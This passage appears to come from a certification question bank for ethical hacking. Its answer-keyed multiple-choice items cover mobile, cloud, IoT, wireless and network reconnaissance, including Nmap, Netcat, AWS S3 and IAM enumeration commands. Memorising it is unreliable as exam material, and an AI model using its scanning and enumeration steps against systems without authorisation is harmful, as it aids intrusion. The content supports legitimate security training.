- B) Cross-Site Request Forgery through mobile app redirection
- C) SQL Injection through QR code payloads
- D) Session hijacking through insecure QR code generation and transmission protocols over mobile networks

**Answer:** C
**Explanation:** The scenario describes untrusted data (SQL commands) embedded in QR codes sent directly to a database interpreter without sanitization or parameterization, which constitutes SQL Injection through QR code payloads - a modern mobile-specific attack vector.
**Source:** https://trustedinstitute.com/topic/ceh/hacking-mobile-platforms/

---

## Q287
**A financial services company recently launched a new mobile banking application for their customers. During a security assessment, you discover that several employees are testing the app with development credentials on their personal devices before the official release. What MDM strategy would best address the security risks in this scenario?**

- A) Deploy a mobile threat defense solution that continuously monitors network traffic
- B) Implement application containerization to isolate the banking app and its data from personal apps
- C) Create a mobile application management policy that blocks screenshots and copy/paste functionality
- D) Configure remote attestation to verify device integrity before allowing access

**Answer:** B
**Explanation:** Application containerization creates a secure, isolated environment (container) on the device that separates sensitive banking data and credentials from personal applications. This addresses the BYOD risk by ensuring corporate data remains protected even on unmanaged personal devices.
**Source:** https://trustedinstitute.com/topic/ceh/hacking-mobile-platforms/

---

## Q288
**Which iOS security mechanism can be exploited using Frida to inject JavaScript into running iOS applications for runtime manipulation?**

- A) Secure Enclave Privilege Escalation
- B) Transport Layer Security Tunneling
- C) Code Signing Bypass
- D) Application Sandbox Protection Layer Manipulation

**Answer:** C
**Explanation:** Frida is a dynamic instrumentation toolkit that can bypass Apple's code signing mechanism, enabling JavaScript injection into running processes for runtime application analysis, hook installation, and manipulation. This is a key technique in iOS application security testing.
**Source:** https://trustedinstitute.com/topic/ceh/hacking-mobile-platforms/

---

## Q289
**Bob exploits Kate's phone loudspeaker vulnerability using a malicious app to monitor audio output. What attack is this?**

- A) SIM card attack
- B) aLTEr attack
- C) Spearphone attack
- D) Man-in-the-disk attack

**Answer:** C
**Explanation:** A Spearphone attack breaches speech privacy by covertly monitoring loudspeaker output using a malicious application that accesses the device's motion sensors (accelerometer) to reconstruct audio from speaker vibrations, without requiring microphone permissions.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q290
**Which jailbreaking technique patches the kernel during boot, making the device jailbroken after each reboot?**

- A) Tethered jailbreaking
- B) Semi-untethered jailbreaking
- C) Semi-tethered jailbreaking
- D) Untethered jailbreaking

**Answer:** D
**Explanation:** Untethered jailbreaks persist across reboots through permanent kernel modifications applied during the boot process. Tethered requires a computer connection each reboot. Semi-tethered boots to stock but can re-jailbreak. Semi-untethered requires an app to re-jailbreak after reboot.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q291
**Jacob extracts and disassembles mobile app source code to analyze design flaws. What is this technique called?**

- A) Reverse engineering
- B) App sandboxing
- C) Jailbreaking
- D) Social engineering

**Answer:** A
**Explanation:** Reverse engineering involves extracting, decompiling, and analyzing application code to identify vulnerabilities, understand logic, and discover design flaws. Tools like IDA Pro, Hopper, Ghidra, jadx, and apktool are commonly used for mobile app reverse engineering.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q292
**When performing user enumeration in Azure AD using the AADInternals PowerShell tool, what does the 'Exists' field display if the user account exists?**

- A) Valid
- B) True
- C) Found
- D) Active

**Answer:** B
**Explanation:** AADInternals is a PowerShell module primarily focused on auditing and attacking Azure Active Directory. When performing user enumeration, the 'Exists' field returns 'True' if the queried user account exists in the Azure AD tenant.
**Source:** https://github.com/Duffer-9533/CEH-V13/blob/main/Module%2019%20-%20Cloud%20Computing

---

## Q293
**During a cloud penetration test, you need to list the contents of a target's misconfigured S3 bucket named 'certifiedhacker02'. Which AWS CLI command would you use?**

- A) aws s3 get s3://certifiedhacker02
- B) aws s3 ls s3://certifiedhacker02
- C) aws s3 cp s3://certifiedhacker02
- D) aws s3 cat s3://certifiedhacker02

**Answer:** B
**Explanation:** The 'aws s3 ls' command lists objects and common prefixes in a specified bucket. This is a critical command in cloud penetration testing for discovering exposed data in misconfigured S3 buckets that allow public listing.
**Source:** https://github.com/Duffer-9533/CEH-V13/blob/main/Module%2019%20-%20Cloud%20Computing

---

## Q294
**During an AWS cloud security assessment, which AWS CLI command allows you to enumerate all user policies for potential privilege escalation paths?**

- A) aws iam get-user-policies
- B) aws iam list-user-policies
- C) aws iam describe-user-policies
- D) aws iam show-user-policies

**Answer:** B
**Explanation:** The 'aws iam list-user-policies' command lists the names of the inline policies attached to a specified IAM user. Identifying overly permissive policies is a key step in IAM privilege escalation during cloud penetration testing.
**Source:** https://github.com/Duffer-9533/CEH-V13/blob/main/Module%2019%20-%20Cloud%20Computing

---

## Q295
**After installing Ubuntu and nginx:1.19.6 Docker images and scanning with the Trivy security scanner, what severity level is typically observed for the bsdutils vulnerability in nginx:1.19.6?**

- A) Critical
- B) Medium
- C) High
- D) Low

**Answer:** B
**Explanation:** Trivy is an open-source vulnerability scanner for containers and other artifacts. When scanning the nginx:1.19.6 image, the bsdutils package vulnerability is classified as Medium severity. Regular container image scanning is essential for identifying and remediating known vulnerabilities.
**Source:** https://github.com/Duffer-9533/CEH-V13/blob/main/Module%2019%20-%20Cloud%20Computing

---

## Q296
**Which of the following is an essential characteristic of cloud computing as defined by NIST SP 800-145?**

- A) Centralized storage
- B) Resource pooling
- C) Reduced bandwidth requirements
- D) Slow elasticity

**Answer:** B
**Explanation:** NIST SP 800-145 identifies five essential characteristics of cloud computing: on-demand self-service, broad network access, resource pooling, rapid elasticity, and measured service. Resource pooling means the provider's resources are pooled to serve multiple consumers using a multi-tenant model.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q297
**An attacker breaches a cloud infrastructure to gather usernames, passwords, tokens, and PINs from a compromised environment. What type of attack method is this?**

- A) Account takeover
- B) Credential harvesting
- C) Privilege escalation
- D) Side-channel attacks

**Answer:** B
**Explanation:** Credential harvesting is the process of gathering and stealing valid usernames, passwords, tokens, and PINs through infrastructure breaches. Unlike account takeover (which uses stolen credentials), credential harvesting focuses on the collection phase.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q298
**An attacker exploits a software bug or design flaw to access resources that are normally protected from an application or user. What type of attack is this?**

- A) Account takeover
- B) Credential harvesting
- C) Privilege escalation
- D) Side-channel attacks

**Answer:** C
**Explanation:** Privilege escalation attacks exploit bugs or design flaws in software to gain access to resources beyond what is normally authorized. In cloud environments, this can allow an attacker to move from a standard user role to administrator access.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q299
**A lower-privileged user accesses functions reserved for higher-privileged users in a cloud environment. What type of privilege escalation is this?**

- A) Vertical privilege escalation
- B) Horizontal privilege escalation
- C) Credential harvesting
- D) Metadata service attacks

**Answer:** A
**Explanation:** Vertical privilege escalation occurs when a standard user accesses functions of an administrator or other higher-privileged role. This is different from horizontal escalation, where a user accesses resources of another user at the same privilege level.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q300
**An attacker gains access to a user account in a cloud environment to subsequently access more accounts and sensitive information. What type of attack is this?**

- A) Account takeover
- B) Metadata service attacks
- C) Resource exhaustion and DoS
- D) Side-channel attacks

**Answer:** A
**Explanation:** Account takeover occurs when an attacker gains access to a legitimate user account and uses it to access additional accounts, escalate privileges, and exfiltrate information. This is particularly dangerous in cloud environments with SSO and federated identity systems.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q301
**Which tool is specifically designed to find vulnerabilities related to metadata service attacks in cloud environments?**

- A) Nimbostratus
- B) Clair
- C) Falco
- D) Dagda

**Answer:** A
**Explanation:** Nimbostratus is a tool for fingerprinting and exploiting Amazon cloud infrastructures, specifically designed to discover and exploit metadata service vulnerabilities (such as SSRF to the EC2 metadata endpoint at 169.254.169.254). Clair and Dagda are container scanners; Falco is a runtime security tool.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q302
**An attacker generates specially crafted packets to crash a cloud application. What type of cloud attack is this?**

- A) Resource exhaustion attack
- B) Account takeover
- C) Metadata service attack
- D) Side-channel attack

**Answer:** A
**Explanation:** Resource exhaustion attacks leverage single-packet DoS vulnerabilities or crafted packets to crash cloud applications, consuming resources and making services unavailable. Cloud architectures with auto-scaling can also be targeted to cause financial damage through resource consumption.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q303
**An attacker creates a malicious application and injects it into a cloud environment targeting SaaS, PaaS, or IaaS layers. What type of attack is this?**

- A) Resource exhaustion attack
- B) Account takeover
- C) Metadata service attack
- D) Cloud malware injection attack

**Answer:** D
**Explanation:** Cloud malware injection attacks involve creating and injecting malicious applications, virtual machines, or service instances into cloud environments. The malicious code then executes alongside legitimate services, potentially stealing data or disrupting operations.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q304
**What is the most common cause of data breaches resulting from misconfigured cloud assets?**

- A) Insecure permission configurations for cloud object storage
- B) Hard-coded credentials in application code
- C) Metadata service credentials
- D) Sensitive information in startup scripts

**Answer:** A
**Explanation:** Insecure permission configurations for cloud object storage services (such as AWS S3 buckets, Azure Blob Storage) are the most common cause of cloud data breaches. Publicly accessible storage buckets have exposed millions of records in high-profile incidents.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q305
**An attacker accesses virtual machines that share physical hardware to extract information from the underlying computer system. What type of attack is this?**

- A) Side-channel attack
- B) Cloud malware injection
- C) Resource exhaustion
- D) Account takeover

**Answer:** A
**Explanation:** Side-channel attacks in cloud environments exploit the shared physical infrastructure (multi-tenancy) to extract information from co-located VMs. Examples include cache-timing attacks (Flush+Reload, Prime+Probe) and Spectre/Meltdown-style attacks that leak data across VM boundaries.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q306
**Which tools help developers deploy cloud applications and use provider resources through infrastructure-as-code approaches?**

- A) Software development kits (SDKs)
- B) Cloud development kits (CDKs)
- C) Identity and access management (IAM)
- D) Nimbostratus

**Answer:** B
**Explanation:** Cloud Development Kits (CDKs) such as AWS CDK allow developers to define cloud infrastructure using familiar programming languages and deploy applications through infrastructure-as-code. SDKs provide API access, IAM manages identity/access, and Nimbostratus is a security tool.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q307
**A mobile vulnerability targets iOS key storage, allowing an attacker to use static analysis or reverse engineering to see how keys are created and stored in the iOS Keychain. What type of vulnerability is this?**

- A) Insecure storage
- B) Passcode vulnerabilities
- C) Certificate pinning
- D) Known vulnerable components

**Answer:** A
**Explanation:** Insecure storage vulnerabilities occur when sensitive data (cryptographic keys, tokens, credentials) is stored improperly in the iOS Keychain or local storage, allowing attackers to extract it through static analysis or reverse engineering of the application binary.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q308
**Which open-source framework is specifically designed for testing iOS application security?**

- A) Needle
- B) Drozer
- C) APK Studio
- D) ApkX

**Answer:** A
**Explanation:** Needle is an open-source modular framework for streamlining iOS security testing. Drozer is for Android security testing. APK Studio and ApkX are Android APK analysis/reverse engineering tools.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q309
**Match the BLE (Bluetooth Low Energy) pairing phases: Phase 1, Phase 2, and Phase 3.**

- A) Phase 1: Transport-specific key distribution, Phase 2: Short-term key generation, Phase 3: Pairing feature exchange
- B) Phase 1: Pairing feature exchange, Phase 2: Short-term key generation, Phase 3: Transport-specific key distribution
- C) Phase 1: Short-term key generation, Phase 2: Pairing feature exchange, Phase 3: Transport-specific key distribution
- D) Phase 1: Pairing feature exchange, Phase 2: Transport-specific key distribution, Phase 3: Short-term key generation

**Answer:** B
**Explanation:** BLE pairing follows three phases: Phase 1 involves pairing feature exchange where devices negotiate capabilities. Phase 2 generates short-term keys (STK) for encrypted communication. Phase 3 handles transport-specific key distribution for long-term bonding.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q310
**Which of the following is a security vulnerability that specifically affects IoT implementations?**

- A) Plaintext communication and data leakage
- B) VM escape vulnerabilities
- C) Certificate pinning
- D) Hyperjacking

**Answer:** A
**Explanation:** IoT devices commonly suffer from plaintext communication and data leakage due to resource constraints and poor security design. Many IoT protocols (like MQTT without TLS) transmit data unencrypted. VM escape and hyperjacking are cloud/virtualization vulnerabilities; certificate pinning is a security measure, not a vulnerability.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q311
**Which of the following IoT/OT systems should NEVER be directly exposed to the Internet? (Choose 2)**

- A) Turbines in a power plant
- B) Robots in a factory
- C) Refrigerators in a restaurant
- D) Thermostats in a home
- E) Carbon monoxide detectors in a home

**Answer:** A, B
**Explanation:** PLCs controlling turbines in power plants and robots in factories are critical OT/ICS systems that should never be directly exposed to the Internet due to the severe physical safety implications of compromise. Consumer IoT devices may have internet connectivity by design, but industrial control systems require air-gapping or strict network segmentation.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q312
**Which specification provides management and monitoring capabilities for compute interfaces independently of CPU, firmware, or operating system?**

- A) Intelligent Platform Management Interface (IPMI)
- B) Shodan
- C) SCADA
- D) Mobile Security Framework

**Answer:** A
**Explanation:** IPMI (Intelligent Platform Management Interface) is a collection of computer interface specifications offering management and monitoring capabilities independently of the host CPU, firmware, and operating system. IPMI vulnerabilities are a common attack vector for IoT/OT systems when exposed to networks.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q313
**A threat actor uploaded fake or impersonated virtual machine images to a cloud marketplace. What type of vulnerability does this exploit?**

- A) VM repository vulnerability
- B) Hypervisor vulnerability
- C) Hyperjacking
- D) VM escape vulnerability

**Answer:** A
**Explanation:** VM repository vulnerabilities occur when attackers upload malicious or impersonated VMs to cloud marketplaces, allowing manipulation of systems, applications, and data when unsuspecting users deploy these tainted images. This is a form of supply chain attack targeting cloud infrastructure.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q314
**Which open-source tool detects Docker image vulnerabilities and uses the ClamAV antivirus engine for malware detection?**

- A) Anchore's Grype
- B) Clair
- C) Dagda
- D) Falco

**Answer:** C
**Explanation:** Dagda is a set of open-source static analysis tools that uses the ClamAV antivirus engine to perform vulnerability scanning and malware detection in Docker images and containers. Grype and Clair are vulnerability scanners without AV integration; Falco is a runtime security tool.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q315
**Why do cloud architectures tend to minimize the impact of DoS/DDoS attacks compared to traditional infrastructure?**

- A) Cloud providers use distributed architecture
- B) Cloud providers use sandbox analysis
- C) Cloud has limited network exposure
- D) Cloud uses IPMI for management

**Answer:** A
**Explanation:** Cloud providers' distributed and resilient architecture minimizes the impact of DoS/DDoS attacks by spreading traffic across multiple regions, data centers, and edge locations. Auto-scaling capabilities and large bandwidth pools make it harder to overwhelm cloud-hosted services.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q316
**Which of the following is a correct characteristic of hypervisors?**

- A) Type 1 hypervisors are native/bare-metal hypervisors that run directly on physical hardware
- B) Type 1 hypervisors run on top of other operating systems
- C) Type 2 hypervisors include ESXi and Hyper-V
- D) Type 2 hypervisors run on bare-metal hardware

**Answer:** A
**Explanation:** Type 1 (bare-metal) hypervisors run directly on physical hardware without a host OS (examples: VMware ESXi, Microsoft Hyper-V, Xen). Type 2 (hosted) hypervisors run on top of an existing operating system (examples: VirtualBox, VMware Workstation/Player).
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q317
**A vulnerability allows an attacker to escape from a virtual machine and obtain access to other virtual machines or the host system. What type of vulnerability is this?**

- A) VM escape vulnerability
- B) VM repository vulnerability
- C) Hypervisor vulnerability
- D) Hyperjacking

**Answer:** A
**Explanation:** VM escape vulnerabilities allow an attacker to break out of the isolation of a virtual machine and interact with the host operating system or other VMs. This is considered one of the most serious cloud/virtualization threats as it breaks the fundamental isolation guarantee.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q318
**Which tool is used to perform on-path (man-in-the-middle) attacks against Bluetooth Low Energy (BLE) devices?**

- A) GATTacker
- B) Social-Engineer Toolkit
- C) Nimbostratus
- D) Dagda

**Answer:** A
**Explanation:** GATTacker is a Node.js tool specifically designed for BLE MITM attacks. It creates a cloned BLE device that intercepts communications between a legitimate BLE device and its connected mobile application, allowing traffic interception and modification.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q319
**Which open-source tool is designed specifically for scanning Docker container images for vulnerabilities?**

- A) Anchore's Grype
- B) GATTacker
- C) Social-Engineer Toolkit
- D) Nimbostratus

**Answer:** A
**Explanation:** Anchore's Grype is an open-source vulnerability scanner designed specifically for container images and filesystems. It scans Docker images against known vulnerability databases (CVEs) to identify security issues before deployment.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q320
**For hybrid IT environments with both on-premise and cloud assets, which tool provides comprehensive coverage, continuous scanning, and change detection?**

- A) GFI LanGuard
- B) Qualys Vulnerability Management
- C) OpenVAS
- D) Nessus Professional

**Answer:** B
**Explanation:** Qualys Vulnerability Management provides comprehensive vulnerability management with continuous monitoring capabilities across hybrid cloud and on-premises infrastructure. It offers cloud-native architecture with agents and scanners that work across distributed environments.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q325
**When testing a WPA3-encrypted wireless network called 'Brakeme-Internal,' which vulnerability is most promising to exploit?**

- A) Cross-site request forgery
- B) Dragonblood
- C) Key reinstallation attack (KRACK)
- D) AP misconfiguration

**Answer:** B
**Explanation:** Dragonblood is a set of vulnerabilities (CVE-2019-9494, CVE-2019-9495) targeting the SAE (Simultaneous Authentication of Equals) handshake mechanism used in WPA3, potentially enabling password recovery through side-channel attacks and downgrade attacks. KRACK targets WPA2, not WPA3.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q326
**What Wi-Fi encryption technology uses SAE (Simultaneous Authentication of Equals / Dragonfly key exchange) instead of PSK, providing resistance against dictionary attacks?**

- A) WPA
- B) WEP
- C) WPA3
- D) WPA2

**Answer:** C
**Explanation:** WPA3 replaces the Pre-Shared Key (PSK) exchange used in WPA2 with the Simultaneous Authentication of Equals (SAE) protocol, also known as the Dragonfly key exchange. SAE provides forward secrecy and resistance against offline dictionary attacks, even if the password is weak.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q327
**Which wireless protocol replaces PSK authentication with SAE and resists offline dictionary attacks?**

- A) Bluetooth
- B) WPA2-Enterprise
- C) WPA3-Personal
- D) ZigBee

**Answer:** C
**Explanation:** WPA3-Personal implements the SAE (Simultaneous Authentication of Equals) handshake instead of PSK for improved resistance against offline dictionary-based attacks. Each connection uses a unique encryption key, providing forward secrecy.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q328
**Which tool is commonly used to perform credential harvesting attacks through spear phishing campaigns that clone legitimate websites?**

- A) Social-Engineer Toolkit (SET)
- B) Searchsploit
- C) Drozer
- D) Dagda

**Answer:** A
**Explanation:** The Social-Engineer Toolkit (SET) automates social engineering attacks including website cloning for credential harvesting, spear phishing campaigns, and payload delivery. It can create convincing clones of legitimate login pages to capture credentials.
**Source:** https://itexamanswers.net/7-3-3-quiz-cloud-mobile-and-iot-security-answers.html

---

## Q341
**An organization needs to build a cloud-native service that handles unpredictable traffic patterns ranging from zero to millions of requests. Which architecture best addresses this requirement while minimizing costs during idle periods?**

- A) Deploy a cluster of always-on virtual machines with load balancing
- B) Use HTTP-triggered serverless functions that automatically scale with incoming requests
- C) Implement a container orchestration platform with fixed replica counts
- D) Set up a dedicated physical server farm with manual scaling procedures

**Answer:** B
**Explanation:** Serverless functions (like AWS Lambda, Azure Functions, Google Cloud Functions) automatically scale out when traffic surges and scale to zero when there is no traffic, making them ideal for unpredictable workloads. This 'pay-per-execution' model eliminates costs during idle periods. Always-on VMs and fixed containers incur costs regardless of usage.
**Source:** https://trustedinstitute.com/topic/ceh/cloud-computing/

---

## Q342
**Jane implements a security model where users maintain rings of public keys for message authentication, with trust established through peer verification rather than a central authority. What model is this?**

- A) Zero trust network
- B) Secure Socket Layer (SSL)
- C) Transport Layer Security (TLS)
- D) Web of trust (WOT)

**Answer:** D
**Explanation:** The Web of Trust (WOT) is a decentralized trust model used in PGP/GPG where users verify each other's identities and sign each other's public keys, creating a network of trust relationships. This differs from Zero Trust (which trusts no one by default) and PKI/CA-based models (SSL/TLS) which use centralized certificate authorities.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

# Reconnaissance, Footprinting & Scanning (73 questions)

## Q1
**Which Nmap switch best identifies the OS of servers in a DMZ?**

- A) nmap -P0
- B) nmap -sO
- C) nmap -sS
- D) nmap -O

**Answer:** D
**Explanation:** The -O flag activates OS detection. -P0 skips ping, -sO does IP protocol scan, -sS does a stealth SYN scan.
**Source:** Pearson IT Certification

---

## Q2
**Identifying the OS of a system by monitoring traffic on a switch describes which activity?**

- A) Vulnerability scanning
- B) Nmap port scanning
- C) Active OS fingerprinting
- D) Passive OS fingerprinting

**Answer:** D
**Explanation:** Passive OS fingerprinting analyzes network traffic without sending probes to the target.
**Source:** Pearson IT Certification

---

## Q3
**What are the correct ICMP types for a ping request and response?**

- A) Type 5 request, Type 3 response
- B) Type 8 request, Type 0 response
- C) Type 3 request, Type 5 response
- D) Type 0 request, Type 8 response

**Answer:** B
**Explanation:** ICMP Type 8 is Echo Request, Type 0 is Echo Reply.
**Source:** Pearson IT Certification

---

## Q4
**Which vulnerability affected Bash in 2014?**

- A) Shellshock
- B) Heartbleed
- C) Bashshell
- D) Poodle

**Answer:** A
**Explanation:** Shellshock (CVE-2014-6271) was a critical vulnerability in the Bash shell allowing arbitrary command execution.
**Source:** Pearson IT Certification

---

## Q5
**Running 'nmap -sX -vv -P0 192.168.1.123 -p 80' against an open port returns what?**

- A) RST
- B) No response
- C) SYN ACK
- D) ACK

**Answer:** B
**Explanation:** An XMAS scan against an open port returns no response. A closed port would return RST.
**Source:** Pearson IT Certification

---

## Q6
**Which Netcat command performs a UDP scan of ports 1-1024?**

- A) Nc -sS -O target 1-1024
- B) Nc -hU <host(s)>
- C) Nc -sU -p 1-1024 <host(s)>
- D) Nc -u -v -w2 <host> 1-1024

**Answer:** D
**Explanation:** The -u flag specifies UDP, -v is verbose, -w2 sets a 2-second timeout.
**Source:** Pearson IT Certification

---

## Q7
**What does 'nmap -sL www.example.com' accomplish?**

- A) System was offline
- B) Checks DNS only, no scanning occurs
- C) Syntax is incorrect
- D) ICMP is blocked

**Answer:** B
**Explanation:** The -sL flag performs a list scan, resolving DNS names without sending packets to the target.
**Source:** Pearson IT Certification

---

## Q8
**With a 20-byte IP header and 84-byte datagram length, which OS is likely?**

- A) Windows XP
- B) Linux
- C) Windows 7
- D) Windows 8

**Answer:** B
**Explanation:** Linux systems typically use a 64-byte payload for ICMP, resulting in 84-byte total datagram.
**Source:** Pearson IT Certification

---

## Q9
**Given 192.168.1.24 and 192.168.1.35 with subnet mask 255.255.255.224, which statement is true?**

- A) They are on the same network
- B) Both have default gateway 192.168.1.63
- C) Both have default gateway 192.168.1.254
- D) They are on separate subnets

**Answer:** D
**Explanation:** A /27 mask creates subnets of 32 addresses. The two IPs fall in different /27 subnets.
**Source:** Pearson IT Certification

---

## Q10
**Which scan type is harder due to lack of responses from open services?**

- A) Stealth scanning
- B) ACK scanning
- C) UDP scanning
- D) FIN scan

**Answer:** C
**Explanation:** UDP scanning is difficult because open UDP ports don't send responses.
**Source:** Pearson IT Certification

---

## Q11
**What is the correct Nmap syntax to extract an SSH host key using scripting?**

- A) nmap -sC -p21, 111, 139 -T3 www.target.com
- B) nmap -sC -p22, 111, 139 -T4 www.target.com
- C) nmap -sL -p21, 111, 139 -T3 www.target.com
- D) nmap -sI -p22, 111, 139 -T4 www.target.com

**Answer:** B
**Explanation:** SSH runs on port 22, -sC enables default scripts, -T4 sets aggressive timing.
**Source:** Pearson IT Certification

---

## Q12
**An ACK scan shows ICMP type 3 code 13. What does this indicate?**

- A) Firewall with ACL is filtering
- B) Port is open
- C) Port knocking is used
- D) Port is closed

**Answer:** A
**Explanation:** ICMP Type 3 Code 13 means Communication Administratively Prohibited.
**Source:** Pearson IT Certification

---

## Q13
**For a Brazilian .com site Whois lookup, which RIR should be queried?**

- A) AfriNIC
- B) ARIN
- C) APNIC
- D) RIPE

**Answer:** B
**Explanation:** ARIN covers North and South America, including Brazil.
**Source:** Pearson IT Certification

---

## Q14
**A Wireshark capture shows FIN, PSH, and URG flags set. Which scan type is this?**

- A) SYN
- B) IPID
- C) NULL
- D) XMAS

**Answer:** D
**Explanation:** XMAS scan sets FIN, PSH, and URG flags.
**Source:** Pearson IT Certification

---

## Q15
**What does 'Nmap -sn 192.168.123.1-254' do?**

- A) Ping only targets, no port scan
- B) NULL TCP scan
- C) TCP port scan
- D) Port scan all targets

**Answer:** A
**Explanation:** The -sn flag performs a ping sweep without port scanning.
**Source:** Pearson IT Certification

---

## Q16
**Which command scans ALL ports on 192.168.123.1?**

- A) nmap -p 1,65536 192.168.123.1
- B) nmap -p- 192.168.123.1
- C) nmap 192.168.123.1 -ports 'all'
- D) nmap -p 0-65536 192.168.123.1

**Answer:** B
**Explanation:** The -p- shorthand scans all 65535 ports.
**Source:** Pearson IT Certification

---

## Q17
**Which technique maps firewall rules on routers?**

- A) NULL scan
- B) ACK scan
- C) Inverse flag scan
- D) Firewalk

**Answer:** D
**Explanation:** Firewalk uses TTL-based techniques to determine which ports a firewall allows.
**Source:** Pearson IT Certification

---

## Q18
**After identifying port 80 is open, what should be the next step?**

- A) Examine webpage source code
- B) Use FTP to connect to port 80
- C) Telnet to the open port and grab the banner
- D) Attempt to connect to port 443

**Answer:** C
**Explanation:** Banner grabbing via telnet identifies the service, version, and potential vulnerabilities.
**Source:** Pearson IT Certification

---

## Q19
**Where should an ethical hacker start the information-gathering process?**

- A) Interviewing the company
- B) Dumpster diving
- C) The company's website
- D) Interviewing employees

**Answer:** C
**Explanation:** The company's website is the natural starting point for passive reconnaissance.
**Source:** Pearson IT Certification

---

## Q20
**What does the Nmap -sT switch do?**

- A) UDP scan
- B) ICMP scan
- C) TCP full connect scan
- D) TCP ACK scan

**Answer:** C
**Explanation:** The -sT flag performs a full TCP connect scan completing the three-way handshake.
**Source:** Pearson IT Certification

---

## Q21
**Which would be considered OUTSIDE the scope of footprinting?**

- A) Finding physical addresses
- B) Attacking targets
- C) Identifying potential targets
- D) Reviewing a company website

**Answer:** B
**Explanation:** Footprinting is information gathering only. Attacking occurs in later phases.
**Source:** Pearson IT Certification

---

## Q22
**During a security assessment, which tool might determine a network range?**

- A) ARIN
- B) DIG
- C) Traceroute
- D) Ping host

**Answer:** A
**Explanation:** ARIN maintains records of IP address allocations and network ranges.
**Source:** Pearson IT Certification

---

## Q23
**The 'intitle:' string is used for what activity?**

- A) Traceroute
- B) Google search (Google dorking)
- C) Website query
- D) Host scanning

**Answer:** B
**Explanation:** intitle: is a Google search operator used in Google dorking.
**Source:** Pearson IT Certification

---

## Q24
**Which TCP scan type is known as the half-open scan?**

- A) FIN scan
- B) XMAS scan
- C) SYN scan
- D) Null scan

**Answer:** C
**Explanation:** SYN scan sends SYN, receives SYN-ACK, then RST instead of completing the handshake.
**Source:** Pearson IT Certification

---

## Q25
**What scan is also known as a zombie scan?**

- A) IDLE scan
- B) SYN scan
- C) FIN scan
- D) Stealth scan

**Answer:** A
**Explanation:** IDLE scan uses a zombie host's predictable IPID sequence to scan without revealing attacker's IP.
**Source:** Pearson IT Certification

---

## Q26
**What TCP port scan toggles on FIN, URG, and PSH flags?**

- A) XMAS scan
- B) Null scan
- C) ACK scan
- D) None of these

**Answer:** A
**Explanation:** XMAS scan sets FIN, URG, and PSH flags simultaneously.
**Source:** Pearson IT Certification

---

## Q27
**Which tools can enumerate systems running NetBIOS?**

- A) Nmap
- B) nbtscan
- C) Metasploit
- D) All of the above

**Answer:** D
**Explanation:** All three tools can enumerate NetBIOS services.
**Source:** Pearson IT Certification

---

## Q28
**What information can be obtained from enumerating insecure SNMP systems?**

- A) Network interface configuration
- B) Device hostname and current time
- C) Device IP routing table
- D) All of the above

**Answer:** D
**Explanation:** SNMP with default community strings reveals extensive system information.
**Source:** Pearson IT Certification

---

## Q29
**What SMTP command verifies whether a user's email mailbox exists?**

- A) EXPN
- B) VRFY
- C) RCPT
- D) None of the above

**Answer:** B
**Explanation:** VRFY checks if a specific mailbox exists on the mail server.
**Source:** Pearson IT Certification

---

## Q30
**Which tool is commonly used for DNS footprinting in reconnaissance?**

- A) Nmap
- B) Metasploit
- C) Nslookup
- D) John the Ripper

**Answer:** C
**Explanation:** Nslookup is specifically designed for querying DNS records.
**Source:** CehTest.com

---

## Q43
**Which tools can perform a DNS zone transfer?**

- A) NSLookup
- B) Finger
- C) Dig
- D) Sam Spade
- E) Host
- F) Netcat
- G) Neotrace

**Answer:** A, C, D, E
**Explanation:** NSLookup, Dig, Sam Spade, and Host support DNS zone transfers.
